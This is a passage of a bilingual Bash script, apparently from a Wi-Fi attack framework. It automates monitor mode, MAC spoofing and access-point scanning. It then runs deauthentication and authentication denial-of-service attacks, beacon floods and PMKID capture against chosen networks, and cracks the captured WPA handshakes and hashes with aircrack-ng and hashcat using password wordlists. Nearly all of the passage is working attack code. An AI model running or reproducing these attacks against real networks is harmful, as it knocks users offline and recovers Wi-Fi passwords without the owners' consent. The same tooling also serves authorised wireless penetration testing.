      good_output_ln "+" "Interface mode: ${greenC}\t\tMonitor"
    else
      good_output_ln "+" "Modo de la interfaz: ${greenC}\tMonitor"
    fi
  else
    if [ "$lang" == "en" ]; then
      good_output_ln "+" "Interface mode: ${grayC}\t\tManaged"
    else
      good_output_ln "+" "Modo de la interfaz: ${grayC}\tManaged"
    fi
  fi
}

# Print interface name, use green color for monitor mode and gray for managed mode
function print_interface_name(){
  if [ -d "/sys/class/net/${netCard}" ]; then
    if [ "$lang" == "en" ]; then
      if [ "$(check_interface_mode)" == "monitor" ]; then
        echo -e "${blueC}[${greenC}+${blueC}] Interface name: ${greenC}\t\t${netCard}${endC}"
      else
        echo -e "${blueC}[${greenC}+${blueC}] Interface name: ${grayC}\t\t${netCard}${endC}"
      fi

    else
      if [ "$(check_interface_mode)" == "monitor" ]; then
        echo -e "${blueC}[${greenC}+${blueC}] Nombre de la interfaz: ${greenC}\t${netCard}${endC}"
      else
        echo -e "${blueC}[${greenC}+${blueC}] Nombre de la interfaz: ${grayC}\t${netCard}${endC}"
      fi
    fi

  else
    if [ "$lang" == "en" ]; then
      echo -e "${blueC}[${yC}X${blueC}] Interface not found${endC}"
    else
      echo -e "${blueC}[${yC}X${blueC}] Interfaz no encontrada${endC}"
    fi
  fi
}

# Print MAC address
function print_mac_address(){
  # Check if network interface is active and exists
  if [ "$(ifconfig | grep "${netCard}" | awk '{print $1}' | tr -d ':')" == "${netCard}" ] && [ "$(check_interface_mode)" != "monitor" ]; then
    current_mac=$(ifconfig | grep "$netCard" -A 3 | grep "ether" | awk '{print $2}')
    if [ "$lang" == "en" ]; then
      echo -e "${blueC}[${greenC}+${blueC}] MAC address: ${grayC}\t\t${current_mac}${endC}"
    else
      echo -e "${blueC}[${greenC}+${blueC}] Dirección MAC: ${grayC}\t\t${current_mac}${endC}"
    fi

  # Function enters here if the function isn't called at the start of the program
  elif [ "$(ifconfig | grep "${netCard}" | awk '{print $1}' | tr -d ':')" == "${netCard}" ] && [ "$(check_interface_mode)" == "monitor" ]; then
    current_mac=$(macchanger -s ${netCard} | grep "Curr" | awk '{print $3}')
    if [ "$lang" == "en" ]; then
      echo -e "${blueC}[${greenC}+${blueC}] MAC address: ${greenC}\t\t${current_mac}${endC}"
    else
      echo -e "${blueC}[${greenC}+${blueC}] Dirección MAC: ${greenC}\t\t${current_mac}${endC}"
    fi

  else
    if [ "$lang" == "en" ]; then
      color_output "X" "An error has ocurred while getting MAC address\n"
    else
      color_output "X" "Ha ocurrido un error al obtener la dirección MAC\n"
    fi
    ctrl_c
  fi 
}

# Print interface frequencies band (2.4Ghz, 5Ghz or both)
function print_freq_band(){
  out=$(iwlist ${netCard} freq)
  if [ "$lang" == "en" ]; then
    if [ "$(echo ${out} | head -n 1 | awk '{print $2}')" -le "14" ]; then
      good_output "+" "Frequencies:\t\t${grayC}2.4Ghz"
    elif [ "$(echo ${out} | head -n 1 | awk '{print $2}')" -ge "32" ]; then
      good_output "+" "Frequencies:\t\t${grayC}2.4Ghz and 5Ghz"
    else
      good_output "+" "Frequencies:\t\t${grayC}5.Ghz"
    fi

  else
    if [ "$(echo ${out} | head -n 1 | awk '{print $2}')" -le "14" ]; then
      good_output "+" "Frecuencias:\t\t${grayC}2.4Ghz"
    elif [ "$(echo ${out} | head -n 1 | awk '{print $2}')" -ge "32" ]; then
      good_output "+" "Frecuencias:\t\t${grayC}2.4Ghz y 5Ghz"
    else
      good_output "+" "Frecuencias:\t\t${grayC}5.Ghz"
    fi
  fi
}

# Enable monitor mode
function enable_mon(){
  # Function enters here if you've enabled monitor mode
  if [ "$(check_interface_mode)" != "monitor" ]; then
    card_check=$(ifconfig | grep "$netCard" | awk '{print $1}' | tr -d ":")
    # Check if the value is the same as the interface to avoid errors in the "else"
    if [ "${card_check}" == "${netCard}" ]; then
      if [ "$lang" == "en" ]; then
        color_output_ln "*" "Configuring network card interface..."
      else
        color_output_ln "*" "Configurando la interfaz de la tarjeta de red..."
      fi

      kill_network_services=$(awk -F '=' '/airmon_check_kill/ {print $2}' /opt/wef/wef.cnf | awk '{print $1}')

      if [ "${kill_network_services}" == "" ]; then
        if [ "$lang" == "en" ]; then
          echo -ne "${blueC}[${yC}*${blueC}] Are you sure to execute \"airmon-ng check kill\"? This will stop your active network connections! [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read k_n_s
        else
          echo -ne "${blueC}[${yC}*${blueC}] Seguro que quieres ejecutar \"airmon-ng check kill\"? Esto cortará tus conexiones activas! [${yC}s${blueC}/${yC}n${blueC}]: ${endC}" && read k_n_s
        fi
        if [ "$k_n_s" == "y" ] || [ "$k_n_s" == "yes" ] || [ "$k_n_s" == "s" ] || [ "$k_n_s" == "si" ]; then
          cat /opt/wef/wef.cnf | grep -v "airmon_check_kill" | sponge /opt/wef/wef.cnf
          echo "airmon_check_kill=true" >> /opt/wef/wef.cnf
          k_n_s="true"
        else
          cat /opt/wef/wef.cnf | grep -v "airmon_check_kill" | sponge /opt/wef/wef.cnf
          echo "airmon_check_kill=false" >> /opt/wef/wef.cnf
          k_n_s="false"
        fi

        if [ "$lang" == "en" ]; then
          echo -e "${blueC}[${yC}*${blueC}] airmon_check_kill set to ${k_n_s}. You can change this later in /opt/wef/wef.cnf${endC}"
        else
          echo -e "${blueC}[${yC}*${blueC}] El valor de airmon_check_kill es ${k_n_s}. Puedes cambiar esto mas tarde en el archivo /opt/wef/wef.cnf${endC}"
        fi
      fi

      if [ "${k_n_s}" == "true" ]; then
        airmon-ng check kill &>/dev/null
      fi

      if [ "$lang" == "en" ]; then
        good_output "+" "Interface configured successfully"
      else
        good_output "+" "Interfaz configurada correctamente"
      fi

      # Enable monitor mode
      mon_output="$(airmon-ng start ${netCard})"
      oldCard="$(echo "${mon_output}" | grep "station mode vif disabled" | awk '{print $NF}' FS="]" | tr -d ")")"
      netCard="$(echo "${mon_output}" | grep "monitor mode vif enabled" | awk '{print $NF}' FS="]")"
      evilCard="${netCard}"
      ifconfig "${netCard}" up 2>/dev/null # Avoid possible errors
      start_counter=1
      export netCard oldCard evilCard # Used on Evil Twin attack

      # Workaround for some weird interfaces which change its name radically after enabling monitor mode
      if [ ! -d "/sys/class/net/${netCard}" ] && [ ! -d "/sys/class/net/${netCard}mon" ]; then
        ask_new_name
      fi

      # Check if your interface name changes when starting in monitor mode by adding "mon" to its name
      #elif [ "$(iwconfig ${netCard}mon | grep 'Mode' | awk '{print $4}' | awk '{print $2}' FS=':')" == "Monitor" ]; then
        #if [ "$lang" == "en" ]; then
          #press_enter "Interface name has changed to ${netCard}mon, press Enter to continue "
        #else
          #press_enter "El nombre de la interfaz ha cambiado a ${netCard}mon, presiona Enter para continuar "
        #fi
        #oldCard="${netCard}"
        #evilCard="${netCard}"
        #netCard="${netCard}mon"
        #start_counter=1
        #export netCard oldCard evilCard

      # Enter here if the name doesn't change when starting in monitor mode
      #elif [ "$(check_interface_mode)" == "monitor" ]; then
        #oldCard="${netCard}"
        #evilCard="${netCard}"
        #start_counter=1
        #export netCard oldCard evilCard
      #fi
    fi
  fi
}

# Disable monitor mode and enable managed mode
function disable_mon(){
  if [ "$lang" == "en" ]; then
    color_output_ln "*" "Configuring interface..."
  else
    color_output_ln "*" "Configurando interfaz..."
  fi
  airmon-ng stop ${netCard} &>/dev/null
  ifconfig ${oldCard} up &>/dev/null
  netCard=${oldCard}

  if [ "$lang" == "en" ]; then
    good_output "+" "Monitor mode disabled"
  else
    good_output "+" "Modo monitor desactivado"
  fi
  start_counter=0
}

# Change MAC address
function mac_randomizer(){
  # Turn off the interface
  ifconfig ${netCard} down

  echo
  if [ "$lang" == "en" ]; then
    color_output_no_line "*" "MAC address to replace the current one with (default=random): " && read mac_to_change
  else
    color_output_no_line "*" "Dirección MAC con la que remplazar la actual (por defecto=random): " && read mac_to_change
  fi

  if [ ! "${mac_to_change}" ]; then
    # Randomize the mac address
    macchanger -a ${netCard} &>/dev/null
  else
    macchanger -m ${mac_to_change} ${netCard} &>/dev/null
  fi

  if [ "$lang" == "en" ]; then
    good_output "+" "MAC address changed successfully"
  else
    good_output "+" "Dirección MAC cambiada correctamente"
  fi

  # Activate again the interface
  ifconfig ${netCard} up
}




#
# Handshake related functions
#

# Start WPA handshake cracking process with aircrack-ng
function handshake_crack(){
  if [ -f "/opt/wef/main/captures/${name}/${cap_name}-01.cap" ]; then
    trap keep_exit_c INT
    ask_dict
    aircrack-ng -w ${wordlist_to_use} "/opt/wef/main/captures/${name}/${cap_name}-01.cap" | tee # "tee" to stop the command with Ctrl + C

    if [ "$lang" == "en" ]; then
      good_output "+" "Cracking process completed"
    else
      good_output "+" "Proceso de cracking completado"
    fi

    reset_info
    keep_exit
  else
    if [ "$lang" == "en" ]; then
      color_output_ln "X" "Handshakes file not found\n"
    else
      color_output_ln "X" "Archivo de handshakes no encontrado\n"
    fi
    sleep 1
  fi
}

# Start PMKID handshake cracking process with hashcat
function pmkid_crack(){
  file_to_crack="/opt/wef/main/captures/${name}/pmkid_hashes"

  if [ -f "${file_to_crack}" ] && [ "$(wc -l "${file_to_crack}" | awk '{print $1}')" != "0" ]; then
    trap keep_exit_c INT
    ask_dict
    if [ "$lang" == "en" ]; then
      color_output_ln "*" "Press Ctrl + C to stop hashcat"
    else
      color_output_ln "*" "Presiona Ctrl + C para parar hashcat"
    fi; sleep 1.5

    hashcat -m 22000 "${file_to_crack}" "${wordlist_to_use}" -d 1
    if [ "$lang" == "en" ]; then
      good_output_ln "+" "Cracking process completed"
    else
      good_output_ln "+" "Proceso de cracking completado"
    fi

    reset_info
    keep_exit

  else
    if [ "$lang" == "en" ]; then
      color_output_ln "*" "No PMKID handshakes captured"
    else
      color_output_ln "*" "No se han capturado handshakes PMKID"
    fi
    reset_info
    keep_exit
  fi
}


# Ask the user to select a wordlist
function ask_dict(){
  if [ "$lang" == "en" ]; then
    color_output_ln "+" "Wordlists availables:"
    echo -e "${blueC}If you want to use a custom dictionary enter its path${endC}\n"
    echo -ne "\t"; color_output_no_line "1" "rockyou.txt\n"
    echo -ne "\t"; color_output_no_line "2" "probable-v2-wpa-top4800.txt\n"
    echo -ne "\t"; color_output_no_line "3" "darkweb2017-top10000.txt\n\n"
    color_output_no_line "*" "Select a wordlist to use: " && read dic_option
  else
    color_output_ln "+" "Diccionarios disponibles:"
    echo -e "${blueC}Si quieres usar un diccionario personalizado escribe su ruta completa${endC}\n"
    echo -ne "\t"; color_output_no_line "1" "rockyou.txt\n"
    echo -ne "\t"; color_output_no_line "2" "probable-v2-wpa-top4800.txt\n"
    echo -ne "\t"; color_output_no_line "3" "darkweb2017-top10000.txt\n\n"
    color_output_no_line "*" "Selecciona un diccionario: " && read dic_option
  fi

  if [ "$dic_option" == "1" ] || [ "$dic_option" == "rockyou" ] || [ "$dic_option" == "rockyou.txt" ]; then
    wordlist_to_use="/opt/wef/main/wordlists/rockyou.txt"

  elif [ "$dic_option" == "2" ] || [ "$dic_option" == "probable" ] || [ "$dic_option" == "probable-v2-wpa-top4800.txt" ]; then
    wordlist_to_use="/opt/wef/main/wordlists/probable-v2-wpa-top4800.txt"

  elif [ "$dic_option" == "3" ] || [ "$dic_option" == "darkweb" ] || [ "$dic_option" == "darkweb2017-top10000.txt" ]; then
    wordlist_to_use="/opt/wef/main/wordlists/darkweb2017-top10000.txt"

  elif [ -f "${dic_option}" ]; then
    wordlist_to_use="${dic_option}"

  elif [ "$dic_option" == "exit" ] || [ "$dic_option" == "quit" ]; then
    ctrl_c

  else
    if [ "$lang" == "en" ]; then
      echo -e "${blueC}Especified wordlist file doesn't exist! Selecting rockyou.txt by default${endC}"
    else
      echo -e "${blueC}El diccionario especificado no existe! Seleccionando rockyou.txt por defecto${endC}"
    fi
    wordlist_to_use="/opt/wef/main/wordlists/rockyou.txt"

  fi
}

# Check if at least 1 handshake has been captured
function check_captured_handshakes(){
  if [ "$(check_handshake)" -gt "0" ]; then
    if [ "$lang" == "en" ]; then
      good_output "+" "$(check_handshake) WPA handshakes captured"
    else
      good_output "+" "$(check_handshake) handshakes WPA capturados"
    fi

  else
    if [ "$lang" == "en" ]; then
      color_output "*" "No WPA handshakes captured"
    else
      color_output "*" "No se han capturado handshakes WPA"
    fi
  fi
}




#
# Access Points related functions
#

function check_ap_list(){
  if [ ! -f "/tmp/.scan_output" ] || [ "$scan_on_each_attack" == "true" ]; then # Check if an AP scan already exists
    # Check config file (first time)
    scan_type=$(awk -F "=" '/scan_type/ {print $2}' /opt/wef/wef.cnf | awk '{print $1}')
    if [ "${scan_type}" == "" ]; then
      if [ "$lang" == "en" ]; then
        color_output_no_line "*" "This is the first time you scan nearby APs, do you want to use 2.4Gh, 5Ghz or both? You can change this later in /opt/wef/wef.cnf [${yC}2.4${blueC}/${yC}5${blueC}/${yC}both${blueC}]: " && read scan_option
      else
        color_output_no_line "*" "Esta es la primera vez que escaneas los APs cercanos, quieres usar 2.4Ghz, 5Ghz o ambos? Puedes cambiar esto mas tarde en /opt/wef/wef.cnf [${yC}2.4${blueC}/${yC}5${blueC}/${yC}both${blueC}]: " && read scan_option
      fi

      if [ "${scan_option}" == "2" ] || [ "${scan_option}" == "2.4" ]; then
        cat /opt/wef/wef.cnf | grep -v "scan_type" | sponge /opt/wef/wef.cnf # Avoid possible errors
        echo "scan_type=2.4" >> /opt/wef/wef.cnf
        check_ap_list
      elif [ "${scan_option}" == "5" ]; then
        cat /opt/wef/wef.cnf | grep -v "scan_type" | sponge /opt/wef/wef.cnf # Avoid possible errors
        echo "scan_type=5" >> /opt/wef/wef.cnf
        check_ap_list
      elif [ "${scan_option}" == "both" ]; then
        cat /opt/wef/wef.cnf | grep -v "scan_type" | sponge /opt/wef/wef.cnf # Avoid possible errors
        echo "scan_type=both" >> /opt/wef/wef.cnf
        check_ap_list
      else
        if [ "$lang" == "en" ]; then
          color_output "X" "Invalid option!"
        else
          color_output "X" "Opción inválida!"
        fi
        check_ap_list
      fi

    elif [ "${scan_type}" == "2.4" ]; then
      if [ "$lang" == "en" ]; then
        color_output_ln "*" "Scanning nearby 2.4Ghz access points...\n"
      else
        color_output_ln "*" "Escaneando puntos de acceso cercanos de 2.4Ghz...\n"
      fi
      timeout 25 bash -c "wash -2 -a -i ${netCard}" | tee /tmp/.scan_output

    elif [ "${scan_type}" == "5" ]; then
      if [ "$lang" == "en" ]; then
        color_output_ln "*" "Scanning nearby 5Ghz access points...\n"
      else
        color_output_ln "*" "Escaneando puntos de acceso cercanos de 5Ghz...\n"
      fi
      timeout 25 bash -c "wash -5 -a -i ${netCard}" | tee /tmp/.scan_output

    elif [ "${scan_type}" == "both" ]; then
      if [ "$lang" == "en" ]; then
        color_output_ln "*" "Scanning nearby 2.4Ghz and 5Ghz access points...\n"
      else
        color_output_ln "*" "Escaneando puntos de acceso cercanos de 2.4Ghz y 5Ghz...\n"
      fi
      timeout 30 bash -c "wash -2 -5 -a -i ${netCard}" | tee /tmp/.scan_output

    fi

  else # If it exists, read content
    if [ "$lang" == "en" ]; then
      color_output_ln "*" "Access points list:\n"
    else
      color_output_ln "*" "Lista de APs:\n"
    fi
    cat /tmp/.scan_output
  fi
}

# Used to refresh/update AP list
function ap_scan(){
  scan_type=$(awk -F "=" '/scan_type/ {print $2}' /opt/wef/wef.cnf | awk '{print $1}')

  if [ "${scan_type}" == "2.4" ]; then
    if [ "$lang" == "en" ]; then
      color_output_ln "*" "Scanning nearby 2.4Ghz access points...\n"
    else
      color_output_ln "*" "Escaneando puntos de acceso cercanos de 2.4Ghz...\n"
    fi
    timeout 25 bash -c "wash -2 -a -i ${netCard}" | tee /tmp/.scan_output

  elif [ "${scan_type}" == "5" ]; then
    if [ "$lang" == "en" ]; then
      color_output_ln "*" "Scanning nearby 5Ghz access points...\n"
    else
      color_output_ln "*" "Escaneando puntos de acceso cercanos de 5Ghz...\n"
    fi
    timeout 25 bash -c "wash -5 -a -i ${netCard}" | tee /tmp/.scan_output

  elif [ "${scan_type}" == "both" ]; then
    if [ "$lang" == "en" ]; then
      color_output_ln "*" "Scanning nearby 2.4Ghz and 5Ghz access points...\n"
    else
      color_output_ln "*" "Escaneando puntos de acceso cercanos de 2.4Ghz y 5Ghz...\n"
    fi
    timeout 30 bash -c "wash -2 -5 -a -i ${netCard}" | tee /tmp/.scan_output
  fi

  if [ "$lang" == "en" ]; then
    good_output_ln "+" "Scan completed"
  else
    good_output_ln "+" "Escaneo completado"
  fi
}

function list_aps(){
  if [ -f "/tmp/.scan_output" ]; then
    echo; cat /tmp/.scan_output
  else
    if [ "$lang" == "en" ]; then
      color_output_ln "*" "APs list not found. Execute 'scan'"
    else
      color_output_ln "*" "Lista de APs no encontrada. Ejecuta 'scan'"
    fi
  fi
}



#
# Attack functions start here
#

# Main deauthentication function
function deauth_attack(){
  clear
  check_ap_list # Show APs info or scan APs if it hasn't been done
  
  log_back_to_menu
  ask_essid
  if [ "$name" == "back" ]; then
    return
  fi
  # Let the user choose the AP to attack if name is duplicated. It often occurs with 5Ghz networks
  parse_info

  echo
  if [ "$lang" == "en" ]; then
    echo -e "${blueC}Type of deauth attack:${endC}"
    color_output "1" "Deauthenticate all clients"
    color_output "2" "Deauthenticate one client"
  else
    echo -e "${blueC}Tipo de ataque de deautenticación:${endC}"
    color_output "1" "Deautenticar a todos los clientes"
    color_output "2" "Deautenticar un cliente"
  fi

  echo
  if [ "$lang" == "en" ]; then
    color_output_no_line "*" "Choose an option >> " && read deauth_option
  else
    color_output_no_line "*" "Selecciona una opción >> " && read deauth_option
  fi; echo

  if [ "${deauth_option}" == "back" ]; then
    return

  elif [ "${deauth_option}" == "exit" ] || [ "$deauth_option" == "quit" ]; then
    ctrl_c

  elif [ "${deauth_option}" != "1" ] && [ "${deauth_option}" != "2" ] && [ "${deauth_option}" != "all" ] && [ "${deauth_option}" != "one" ]; then
    if [ "$lang" == "en" ]; then
      color_output_ln "X" "Unknown option!"; sleep 0.75
    else
      color_output_ln "X" "Opción inválida!"; sleep 0.75
    fi
    deauth_attack
  fi

  if [ "${deauth_option}" == "1" ] || [ "${deauth_option}" == "all" ]; then
    deauth_all_clients
  elif [ "${deauth_option}" == "2" ] || [ "${deauth_option}" == "one" ]; then
    deauth_one_client
  fi
}

# Deauth all clients
function deauth_all_clients(){
  check_and_create "/opt/wef/main/captures/${name}"
  ask_handshakes

  default="10"
  ask_packets
  if [ "$packets_to_send" == "back" ]; then
    if [ "$c_h" == "true" ]; then
      kill -9 ${air_PID}; wait ${air_PID} 2>/dev/null
    fi
    return
  fi; sleep 0.1

  clear
  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting Deauthentication attack, press Ctrl + C if you want to stop it"
  else
    progress_bar 2 0.2 "*" "Comenzando ataque de Deautenticación, presiona Ctrl + C si quieres pararlo"
  fi

  iwconfig ${netCard} channel ${channel} # Configure the interface on the same channel
  if [[ $verbose == 0 ]]; then
    aireplay-ng -0 ${packets_to_send} -e "${name}" -c FF:FF:FF:FF:FF:FF ${netCard} &>/dev/null # add "-D" to avoid errors
  elif [[ $verbose == 1 ]]; then
    echo
    aireplay-ng -0 ${packets_to_send} -e "${name}" -c FF:FF:FF:FF:FF:FF ${netCard} 2>/dev/null # add "-D" to avoid errors
  fi

  if [ "${c_h}" == "true" ]; then # Enter here is user wants to capture handshakes
    echo
    if [ "$lang" == "en" ]; then
      progress_bar 4 2.5 "*" "Waiting while clients reconect to AP to capture handshakes"
    else
      progress_bar 4 2.5 "*" "Esperando mientras los clientes se reconectan al AP para capturar los handshakes"
    fi
    kill -9 ${air_PID}; wait ${air_PID} 2>/dev/null

    check_captured_handshakes

    if [ "$lang" == "en" ]; then
      color_output "*" "Capture saved in /opt/wef/main/captures/${name}/${cap_name}-01.cap"
    else
      color_output "*" "Captura guardadas en /opt/wef/main/captures/${name}/${cap_name}-01.cap"
    fi
  fi

  report-gen
  log_completed
  ask_to_crack_handshakes

  if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ] || [ "$crack_option" == "s" ] || [ "$crack_option" == "si" ]; then
    handshake_crack
  else
    reset_info
    keep_exit
  fi
}

function deauth_one_client(){
  check_and_create "/opt/wef/main/captures/${name}"
  ask_handshakes
  ask_mac2
  if [ "$client_mac" == "back" ]; then
    if [ "$c_h" == "true" ]; then
      kill -9 ${air_PID}; wait ${air_PID} 2>/dev/null
    fi
    return
  fi

  if [ "${c_h}" != "true" ]; then
    kill -9 ${air_PID}; wait ${air_PID} 2>/dev/null
  fi

  default="10"
  ask_packets
  if [ "$packets_to_send" == "back" ]; then
    if [ "$c_h" == "true" ]; then
      kill -9 ${air_PID}; wait ${air_PID} 2>/dev/null
    fi
    return
  fi; sleep 0.1

  clear
  log_attack_info
  press_enter_attack
  echo

  iwconfig ${netCard} channel ${channel} # Configure the interface on the same channel
  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting Deauthentication attack, press Ctrl + C if you want to stop it"
  else
    progress_bar 2 0.2 "*" "Comenzando ataque de Deautenticación, presiona Ctrl + C si quieres pararlo"
  fi

  if [[ $verbose == 0 ]]; then
    aireplay-ng -0 ${packets_to_send} -a ${ap_mac} -c ${client_mac} ${netCard} &>/dev/null
  elif [[ $verbose == 1 ]]; then
    echo
    aireplay-ng -0 ${packets_to_send} -a ${ap_mac} -c ${client_mac} ${netCard} 2>/dev/null
  fi

  if [ "${c_h}" == "true" ]; then
    echo
    if [ "$lang" == "en" ]; then
      progress_bar 4 2.2 "*" "Waiting while client reconects to AP to capture handshake"
    else
      progress_bar 4 2.2 "*" "Esperando mientras el cliente se reconecta al AP para capturar su handshake"
    fi
    kill -9 ${air_PID}; wait ${air_PID} 2>/dev/null

    check_captured_handshakes

    if [ "$lang" == "en" ]; then
      color_output "*" "Capture saved in /opt/wef/main/captures/${name}/${cap_name}-01.cap"
    else
      color_output "*" "Captura guardadas en /opt/wef/main/captures/${name}/${cap_name}-01.cap"
    fi
  fi

  report-gen
  log_completed
  ask_to_crack_handshakes

  if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ] || [ "$crack_option" == "s" ] || [ "$crack_option" == "si" ]; then
    handshake_crack
  elif [ "$crack_option" == "exit" ] || [ "$crack_option" == "quit" ]; then
    ctrl_c
  else
    reset_info
    keep_exit
  fi
}

# Auth Attack
function auth_attack(){
  clear
  check_ap_list # Show APs info or scan APs if it hasn't been done yet
  log_back_to_menu

  ask_essid
  if [ "$name" == "back" ]; then
    return
  fi
  parse_info

  default="120s"
  ask_time
  if [ "$attack_time" == "back" ]; then
    return
  fi

  check_and_create "/opt/wef/main/captures/${name}" # Create dir
  ask_handshakes # Ask user if he/she wants to capture handshakes

  clear
  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting Authentication DoS attack, press Ctrl + C if you want to stop it"
  else
    progress_bar 2 0.2 "*" "Comenzando ataque de Autenticación DoS, presiona Ctrl + C si quieres pararlo"
  fi

  iwconfig ${netCard} channel ${channel}
  if [[ $verbose == 0 ]]; then
    mdk4 ${netCard} a -i ${ap_mac} &>/dev/null &
  elif [[ $verbose == 1 ]]; then
    echo
    mdk4 ${netCard} a -i ${ap_mac} &
  fi
  mdk4_PID=$!
  sleep "${attack_time}"
  kill -9 ${mdk4_PID} 2>/dev/null; wait ${mdk4_PID} 2>/dev/null
  
  if [ "$c_h" == "true" ]; then
    echo
    if [ "$lang" == "en" ]; then
      progress_bar 4 2.2 "*" "Waiting while clients reconect to AP to capture handshakes"
    else
      progress_bar 4 2.2 "*" "Esperando mientras los clientes se reconectan al AP para capturar los handshakes"
    fi

    kill -9 ${air_PID}; wait ${air_PID} 2>/dev/null

    check_captured_handshakes

    if [ "$lang" == "en" ]; then
      color_output "*" "Capture saved in /opt/wef/main/captures/${name}/${cap_name}-01.cap"
    else
      color_output "*" "Captura guardada en /opt/wef/main/captures/${name}/${cap_name}-01.cap"
    fi
  fi

  report-gen
  log_completed
  reset_info
  keep_exit
}

# Beacon Attack
function beacon_flood(){
  clear
  check_ap_list # Show APs info or scan APs if it hasn't been done
  log_back_to_menu

  ask_essid
  if [ "$name" == "back" ]; then
    return
  fi
  parse_info

  default="300s"
  ask_time
  if [ "$attack_time" == "back" ]; then
    return
  fi

  if [ "$lang" == "en" ]; then
    echo -e "\n${blueC}Type of attack:${endC}"
    color_output "1" "With a custom wordlist of AP names"
    color_output "2" "With random AP names (default)"
  else
    echo -e "\n${blueC}Tipo de ataque:${endC}"
    color_output "1" "Con un diccionario personalizado de nombres"
    color_output "2" "Con nombres aleatorios (por defecto)"
  fi

  echo
  if [ "$lang" == "en" ]; then
    color_output_no_line "*" "Choose an option >> " && read beacon_option
  else
    color_output_no_line "*" "Selecciona una opción >> " && read beacon_option
  fi

  if [ "$beacon_option" == "back" ]; then
    return
  elif [ "$beacon_option" == "exit" ] || [ "$beacon_option" == "quit" ]; then
    ctrl_c
  elif [ ! "$beacon_option" ]; then
    beacon_option="2"
  elif [ "$beacon_option" != "1" ] && [ "$beacon_option" != "2" ]; then
    beacon_option="2"
  fi

  clear
  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting Beacon Flood attack, press Ctrl + C if you want to stop it"
  else
    progress_bar 2 0.2 "*" "Comenzando ataque Beacon Flood, presiona Ctrl + C si quieres pararlo"
  fi

  iwconfig ${netCard} channel ${channel}; sleep 0.2 # Change channel to target one

  if [ "$beacon_option" == "2" ] && [[ $verbose == 0 ]]; then
    mdk4 ${netCard} b -c ${channel} -s 200 &>/dev/null &
  elif [ "$beacon_option" == "2" ] && [[ $verbose == 1 ]]; then
    echo
    mdk4 ${netCard} b -c ${channel} -s 200 &
  elif [ "$beacon_option" == "1" ] && [[ $verbose == 0 ]]; then
    if [ "$lang" == "en" ]; then
      color_output_no_line "*" "File with the AP names: " && read names_file
    else
      color_output_no_line "*" "Archivo con los nombres de los APs: " && read names_file
    fi
    mdk4 ${netCard} b -c ${channel} -s 200 -f "${names_file}" &>/dev/null &
  elif [ "$beacon_option" == "1" ] && [[ $verbose == 1 ]]; then
    echo
    if [ "$lang" == "en" ]; then
      color_output_no_line "*" "File with the AP names: " && read names_file
    else
      color_output_no_line "*" "Archivo con los nombres de los APs: " && read names_file
    fi
    echo
    mdk4 ${netCard} b -c ${channel} -s 200 -f "${names_file}" &
  fi

  mdk4_PID=$!
  sleep "${attack_time}"
  kill -9 ${mdk4_PID} 2>/dev/null; wait ${mdk4_PID} 2>/dev/null

  report-gen
  log_completed
  reset_info
  keep_exit
}

# PMKID Attack
function pmkid_attack(){
  clear
  check_ap_list # Show APs info or scan APs if it hasn't been done
  log_back_to_menu

  # Disable monitor mode as hcxtools may break if interface isn't in monitor mode
  airmon-ng stop ${netCard} &>/dev/null

  ask_essid
  if [ "$name" == "back" ]; then
    return
  fi
  parse_info

  default="180s"
  ask_time
  if [ "$attack_time" == "back" ]; then
    return
  fi

  # Parse wifi info
  if [[ $channel -le 14 ]]; then
    pmkid_channel="${channel}a"
  elif [[ $channel -gt 14 ]]; then
    pmkid_channel="${channel}b"
  fi

  clear
  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting PMKID attack, press Ctrl + C if you want to stop it"
  else
    progress_bar 2 0.2 "*" "Comenzando ataque PMKID, presiona Ctrl + C si quieres pararlo"
  fi

  check_and_create "/opt/wef/main/captures/${name}"

  hcxdumptool -i ${oldCard} -c ${pmkid_channel} -w "/opt/wef/main/captures/${name}/pmkid_capture" | grep -v "bye-bye" &
  hcx_PID=$!
  sleep "${attack_time}"
  kill -9 ${hcx_PID} 2>/dev/null; wait ${hcx_PID} 2>/dev/null

  sleep 0.2

  if [ "$lang" == "en" ]; then
    progress_bar 2 0.3 "*" "Obtaining hashes (/opt/wef/main/captures/${name}/pmkid_capture)"
  else
    progress_bar 2 0.3 "*" "Obteniendo hashes (/opt/wef/main/captures/${name}/pmkid_capture)"
  fi
  sleep 0.2 # Let the user read

  if [[ $verbose == 0 ]]; then
    hcxpcapngtool -o "/opt/wef/main/captures/${name}/mixed_hashes" "/opt/wef/main/captures/${name}/pmkid_capture" &>/dev/null
  elif [[ $verbose == 1 ]]; then
    echo
    hcxpcapngtool -o "/opt/wef/main/captures/${name}/mixed_hashes" "/opt/wef/main/captures/${name}/pmkid_capture"
  fi

  if [ -f "/opt/wef/main/captures/${name}/mixed_hashes" ]; then
    if [ "$lang" == "en" ]; then
      progress_bar 2 0.2 "*" "Filtering hashes of target AP"
    else
      progress_bar 2 0.2 "*" "Filtrando hashes del AP objetivo"
    fi

    if [[ $verbose == 0 ]]; then
      hcxhashtool -o "/opt/wef/main/captures/${name}/pmkid_hashes" --type=1 --mac-ap=${ap_mac} -i "/opt/wef/main/captures/${name}/mixed_hashes" &>/dev/null
    elif [[ $verbose == 1 ]]; then
      hcxhashtool -o "/opt/wef/main/captures/${name}/pmkid_hashes" --type=1 --mac-ap=${ap_mac} -i "/opt/wef/main/captures/${name}/mixed_hashes" | head -c -1
    fi
  fi

  # Re-enable monitor mode (with airmon-ng)
  ifconfig ${oldCard} down
  iwconfig ${oldCard} mode managed
  ifconfig ${oldCard} up
  airmon-ng start ${oldCard} &>/dev/null

  report-gen
  log_completed

  if [ -f "/opt/wef/main/captures/${name}/pmkid_hashes" ]; then
    if [ "$lang" == "en" ]; then
      handshake_total=$(wc -l "/opt/wef/main/captures/${name}/pmkid_hashes" | awk '{print $1}')
      color_output "*" "${handshake_total} handshakes written to /opt/wef/main/captures/${name}/pmkid_hashes"
